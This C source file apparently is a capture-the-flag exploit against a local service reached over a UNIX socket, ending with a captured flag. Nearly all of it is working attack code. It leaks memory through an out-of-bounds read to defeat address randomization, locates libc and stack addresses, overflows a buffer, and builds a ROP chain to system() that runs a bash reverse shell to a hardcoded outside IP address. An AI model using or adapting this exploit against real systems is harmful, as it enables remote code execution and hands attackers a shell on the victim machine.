#include <stddef.h>
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <zlib.h>

int ping_srv(int fd) {
    char s[269];
    memset(s, 0, 269);
    s[8] = 'D';
    s[9] = 'A';
    s[10] = '7';
    s[11] = '7';
    s[12] = '7';
    s[13] = 1;
    // strcpy(&s[14], "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    s[14] = 0;
    
    *(unsigned long long*)&s[64] = 0xdeadbeefcafebabe;

    unsigned long long checksum_init = adler32(0, 0, 0);
    *(unsigned long long*)s = adler32(checksum_init, s, 269);

    if (write(fd, s, 269) != 269) {
        puts("failed write");
        exit(-1);
    }

    char response[256];
    if ( read(fd, response, 0x100) != 256 ) {
        puts("failed read");
        exit(-1);
    }

    puts("PING SUCCESS");
}

int get_secret(int fd) {
    char s[269];
    memset(s, 0, 269);
    s[8] = 'D';
    s[9] = 'A';
    s[10] = '7';
    s[11] = '7';
    s[12] = '7';
    s[13] = 4;
    // strcpy(&s[14], "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    s[14] = 0;

    unsigned long long checksum_init = adler32(0, 0, 0);
    *(unsigned long long*)s = adler32(checksum_init, s, 269);

    if (write(fd, s, 269) != 269) {
        puts("failed write");
        exit(-1);
    }

    char response[256];
    if ( read(fd, response, 0x100) != 256 ) {
        puts("failed read");
        exit(-1);
    }

    puts(&response[1]);
}

void check_hash(int fd, char *str) {
    char s[269];
    memset(s, 0, 269);
    s[8] = 'D';
    s[9] = 'A';
    s[10] = '7';
    s[11] = '7';
    s[12] = '7';
    s[13] = 2;
    strcpy(&s[14], str);
    // s[14] = 0;

    unsigned long long checksum_init = adler32(0, 0, 0);
    *(unsigned long long*)s = adler32(checksum_init, s, 269);

    if (write(fd, s, 269) != 269) {
        puts("failed write");
        exit(-1);
    }

    char response[256];
    if ( read(fd, response, 0x100) != 256 ) {
        puts("failed read");
        exit(-1);
    }

    printf("check response: %d\n", response[0]);
}

int is_good(char* buf) {
    int succ = 0;
    while (*buf) {
        if (*buf == 0xfa) {
            succ = 1;
        }
        ++buf;
    }
    return succ;
}

void hexdump(char* buf) {
    while (*buf) {
        printf("%x ", (unsigned int)(*buf) & 0xff);
        if (*buf == 0x7f) {
            printf(" ALERT ");
        }
        ++buf;
    }
    puts("");
}

void read_hash(int fd, unsigned long long index, char* response) {
    char s[269];
    memset(s, 0, 269);
    s[8] = 'D';
    s[9] = 'A';
    s[10] = '7';
    s[11] = '7';
    s[12] = '7';
    s[13] = 3;
    // strcpy(&s[14], "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    *(unsigned long long*)&s[14] = index;
    
    *(unsigned long long*)&s[64] = 0xdeadbeefcafebabe;

    unsigned long long checksum_init = adler32(0, 0, 0);
    *(unsigned long long*)s = adler32(checksum_init, s, 269);

    if (write(fd, s, 269) != 269) {
        puts("failed write");
        exit(-1);
    }

    if ( read(fd, response, 0x100) != 256 ) {
        puts("failed read");
        exit(-1);
    }

    if (!is_good(&response[1]))
        return;
    printf("read response: %d\n", response[0]);
    printf("%lld: ", index);
    hexdump(&response[1]);
}

void overflow(int fd, char* payload, int size) {
    char s[269];
    memset(s, 0, 269);
    s[8] = 'D';
    s[9] = 'A';
    s[10] = '7';
    s[11] = '7';
    s[12] = '7';
    s[13] = 2;
    memcpy(&s[14], payload, size);
    // s[14] = 0;
    *(unsigned long long*)&s[64] = 0xdeadbeefcafebabe;

    unsigned long long checksum_init = adler32(0, 0, 0);
    *(unsigned long long*)s = adler32(checksum_init, s, 269);

    if (write(fd, s, 269) != 269) {
        puts("failed write");
        exit(-1);
    }

    char response[256];
    if ( read(fd, response, 0x100) != 256 ) {
        puts("failed read");
        exit(-1);
    }
}

void overflow_rop(int fd, unsigned long long counter, unsigned long long dest, unsigned long long gadget, unsigned long long system_addr, unsigned long long shell, unsigned long long bp) {
    char s[269];
    memset(s, 0, 269);
    s[8] = 'D';
    s[9] = 'A';
    s[10] = '7';
    s[11] = '7';
    s[12] = '7';
    s[13] = 2;

    char payload[64];    
    memset(payload, 0, 64);
    
    memset(payload, 'A', 32);
    *(long long*)&payload[32] = counter;
    *(long long*)&payload[40] = dest;

    strcpy(&s[14], payload);
    // s[14] = 0;
    
    int i = 0;
    *(unsigned long long*)&s[64 + 33 * i] = 0xdeadbeefcafebabe;
    *(unsigned long long*)&s[72 + 33 * i] = 0x4545454545454545;
    *(unsigned long long*)&s[80 + 33 * i] = 0x4747474747474747;
    *(unsigned long long*)&s[88 + 33 * i] = system_addr;
    
    i++;
    *(unsigned long long*)&s[64 + 33 * i] = 0xdeadbeefcafebabe;
    *(unsigned long long*)&s[72 + 33 * i] = 0x4545454545454545;
    *(unsigned long long*)&s[80 + 33 * i] = 0x0047474747474747;
    
    i++;
    *(unsigned long long*)&s[64 + 33 * i] = 0xdeadbeefcafebabe;
    *(unsigned long long*)&s[72 + 33 * i] = 0x4545454545454545;
    *(unsigned long long*)&s[80 + 33 * i] = shell;

    i++;
    *(unsigned long long*)&s[64 + 33 * i] = 0xdeadbeefcafebabe;
    *(unsigned long long*)&s[72 + 33 * i] = 0x0045454545454545;
    
    i++;
    *(unsigned long long*)&s[64 + 33 * i] = 0xdeadbeefcafebabe;
    *(unsigned long long*)&s[72 + 33 * i] = gadget;

    i++;
    *(unsigned long long*)&s[64 + 33 * i] = 0x00adbeefcafebabe;

    i++;
    *(unsigned long long*)&s[64 + 33 * i] = bp;

    unsigned long long checksum_init = adler32(0, 0, 0);
    *(unsigned long long*)s = adler32(checksum_init, s, 269);

    if (write(fd, s, 269) != 269) {
        puts("failed write");
        exit(-1);
    }

    char response[256];
    if ( read(fd, response, 0x100) != 256 ) {
        puts("failed read");
        exit(-1);
    }
}

unsigned long long compute_index(unsigned long long x) {
    return 1117984489315730401 * x;
}

unsigned long long read_offset(int fd, unsigned long long offset) {
    char res[10];
    memset(res, 0, 8);
    int len = 0;

    while(len < 8) {
        // printf("Index: %d\n", len);
        char buffer[256];
        read_hash(fd, compute_index(offset + len), buffer);
        strncpy(res + len, buffer + 1, 8 - len);
        len += strlen(&buffer[1]) + 1;
    }

   return *(unsigned long long*) res;
}

unsigned long long scan(int fd, unsigned long long start, unsigned long long needle, unsigned long long mask) {
    unsigned long long offset = start;
    while (1) {
        if (offset % 0x100 == 0) {
            printf("[+] Scanning offset: 0x%llx\n", offset);
        }
        unsigned long long val = read_offset(fd, offset);
        if ((val & mask) == needle) {
            printf("[+] Found needle: 0x%llx\n", offset);
            return offset;
        }
        offset += 8;
    }
}

unsigned long long place_and_find_needle(int fd, unsigned long long offset) {
    while(1) {
        if (read_offset(fd, offset) == 0xdeadbeefcafebabe) {
            return offset;
        }
        offset -= 8;
    }
}

int main(int argc, char** argv) {
    int fd = socket(1, 1, 0);
    struct sockaddr_un addr;
    memset(&addr, 0, 110);
    addr.sun_family = AF_UNIX;
    const char* socketname = "secretSock";
    strncpy(&addr.sun_path[1], socketname, strlen(socketname));

    if (connect(fd, (const struct sockaddr *) &addr, sizeof(addr)) == -1) {
        puts("failed connect");
        return -1;
    }

    check_hash(fd, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");

    /* pls work */
    unsigned long long MAGIC_OFFSET = read_offset(fd, 0x1000);
    printf("[+] magic offset: 0x%llx\n", MAGIC_OFFSET);

    unsigned long long DB_BASE = MAGIC_OFFSET - 0x50 - 0x1000;
    printf("[+] Found DB_BASE: 0x%llx\n", DB_BASE);

    /* Sanity check */
    if (read_offset(fd, 0x400000 - DB_BASE) % 0x100000000 != 0x464c457f) {
        puts("[+] Sanity check failed");
    }
    else {
        puts("[+] Sanity check: This address should be correct");
    }

    // unsigned long long LD_BASE = read_offset(fd, 0x1008) - 0x1f91a;
    unsigned long long LD_BASE = read_offset(fd, 0x1008) - 0x1d3da;
    unsigned long long MAGIC_BYTE = LD_BASE + 0xa;
    printf("[+] Found MAGIC_BYTE: 0x%llx\n", MAGIC_BYTE);

    long long counter = MAGIC_BYTE - DB_BASE;
    printf("[+] counter: 0x%llx\n", counter);

    unsigned long long LD_GOT_PLT = LD_BASE + 0x224000;
    unsigned long long LIBC_MALLOC = read_offset(fd, LD_GOT_PLT + 0x20 - DB_BASE);
    printf("[+] Found LIBC MALLOC: 0x%llx\n", LIBC_MALLOC);
    unsigned long long LIBC_BASE = LIBC_MALLOC - 0x7af10;
    printf("[+] Found LIBC BASE: 0x%llx\n", LIBC_BASE);
    
    unsigned long long ENVIRON_OFFSET = LIBC_BASE + 0x39bf38 - DB_BASE;
    printf("[+] ENVIRON OFFSET: 0x%llx\n", ENVIRON_OFFSET);

    unsigned long long ENVIRON = read_offset(fd, ENVIRON_OFFSET);
    printf("[+] Found ENVIRON: 0x%llx\n", ENVIRON);

    unsigned long long NEW_BASE_OFFSET = LIBC_BASE + 0x399000 + 0xf8 - DB_BASE;
    printf("[+] NEW BASE OFFSET: 0x%llx\n", NEW_BASE_OFFSET);
    unsigned long long NEW_BASE = read_offset(fd, NEW_BASE_OFFSET + 8);
    printf("[+] NEW BASE: 0x%llx\n", NEW_BASE);

    // overwrite base with PROGRAM_NAME_ADDR
    printf("\nChange BASE to 0x%llx\n\n", NEW_BASE);
    char change_base_payload[48];
    
    for (int i = 0; i < 4; ++i) {
        *(long long*)&change_base_payload[i * 8] = read_offset(fd, NEW_BASE_OFFSET + 8 + i * 8);
    }

    *(long long*)&change_base_payload[32] = NEW_BASE_OFFSET;
    *(long long*)&change_base_payload[40] = 0x603108;
    overflow(fd, change_base_payload, 48);

    unsigned long long NEEDLE_OFFSET = place_and_find_needle(fd, ENVIRON - NEW_BASE);
    printf("[+] Found NEEDLE_OFFSET: 0x%llx\n", NEEDLE_OFFSET);

    // 0xf8
    unsigned long long RET_ADDR_OFFSET = NEEDLE_OFFSET - 0x68;
    unsigned long long RET_ADDR_LOC = RET_ADDR_OFFSET + NEW_BASE;
    printf("[+] RET ADDR OFFSET: 0x%llx\n", RET_ADDR_OFFSET);
    printf("[+] RET ADDR: 0x%llx\n", NEW_BASE + RET_ADDR_OFFSET);
    printf("[+] Sanity check RET ADDR: 0x%llx\n", read_offset(fd, RET_ADDR_OFFSET));

    unsigned long long NEW_COUNTER = NEEDLE_OFFSET;
    printf("[+] NEW COUNTER: 0x%llx\n", NEW_COUNTER);
    
    // bash -i >& /dev/tcp/188.166.219.74/8000 0>&1

    puts("\nGetting shell...\n");

    char* SHELL = "bash -c \"bash -i >& /dev/tcp/188.166.219.74/8080 0>&1\"";
    // char* SHELL = "./shell";
    char PLANT_SHELL[144];
    memset(PLANT_SHELL, 0, 144);
    memcpy(PLANT_SHELL, SHELL, 32);
    *(long long*)&PLANT_SHELL[32] = 0x10 + NEEDLE_OFFSET;
    *(long long*)&PLANT_SHELL[40] = DB_BASE + 0x10;
    strcpy(&PLANT_SHELL[66], SHELL);
    overflow(fd, PLANT_SHELL, 144);

    unsigned long long POP_RDI_GADGET = LIBC_BASE + 0x1fc6a;
    printf("[+] POP RDI GADGET: 0x%lx\n", POP_RDI_GADGET);
    unsigned long long SYSTEM = LIBC_BASE + 0x3f480;
    printf("[+] SYSTEM: 0x%lx\n", SYSTEM);

    puts("\nOpening shell\n");
    ping_srv(fd);
    overflow_rop(fd, NEW_COUNTER, RET_ADDR_LOC, POP_RDI_GADGET, SYSTEM, DB_BASE + 0x10, RET_ADDR_LOC - 0x1000);

    return 0;
}

// flag{!!!Well_this_is_was_honestly_not_expeted_grats!!!}